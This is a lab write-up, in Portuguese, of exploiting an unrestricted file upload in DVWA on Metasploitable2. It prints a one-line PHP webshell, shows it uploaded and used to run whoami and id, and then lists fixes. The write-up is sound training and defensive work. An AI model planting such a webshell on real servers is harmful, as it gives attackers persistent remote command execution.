# Writeup: Unrestricted File Upload (Webshell) - DVWA - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: DVWA (Damn Vulnerable Web App) rodando em Metasploitable2
- URL: http://192.168.56.10/dvwa/vulnerabilities/upload/
- Nível de segurança: Low

## 1. Identificação da vulnerabilidade
A funcionalidade de upload de imagem não valida o tipo/extensão
do arquivo enviado, permitindo upload de um script PHP
executável no lugar de uma imagem.

## 2. Criação do payload
Webshell mínimo criado localmente:

    <?php system($_GET['cmd']); ?>

## 3. Upload e exploração
Arquivo enviado via formulário de upload. Confirmação da
aplicação:

    ../../hackable/uploads/webshell.php succesfully uploaded!

Acesso direto ao webshell via URL, com execução de comando
arbitrário através do parâmetro `cmd`:

    http://192.168.56.10/dvwa/hackable/uploads/webshell.php?cmd=whoami
    -> www-data

    http://192.168.56.10/dvwa/hackable/uploads/webshell.php?cmd=id
    -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Impacto
Diferente do Command Injection (que exige reenviar o payload a
cada execução), o webshell é persistente: o arquivo permanece no
servidor, permitindo execução de comando arbitrário a qualquer
momento através de uma simples requisição HTTP, sem necessidade
de reexplorar a vulnerabilidade original.

## Conclusão
Falha crítica de upload sem restrição de tipo de arquivo. Como
correção: validar extensão E conteúdo real do arquivo (não
confiar apenas no nome/extensão), armazenar uploads fora da raiz
web acessível publicamente, desabilitar execução de scripts no
diretório de uploads, e usar nomes de arquivo aleatórios/hash
para dificultar acesso direto.
